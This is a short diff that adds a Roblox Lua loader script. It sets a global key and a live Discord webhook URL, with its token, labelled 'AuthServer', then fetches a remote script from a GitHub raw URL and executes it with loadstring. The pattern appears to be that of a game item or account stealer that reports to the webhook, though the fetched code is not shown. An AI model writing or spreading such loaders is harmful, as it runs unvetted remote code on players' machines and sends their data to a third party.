@@ -1,0 +1,3 @@
+_G.Key = "GNIMAGSKLATOSSUR"
+_G.AuthServer = "https://discord.com/api/webhooks/1051108601609060393/DwOrGuZ1wCyMCHh4Ta_jXpndeNwq-UIWuqmoU7g0jRLSMLbj6V69CVub5UXb-XXPsG0C"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
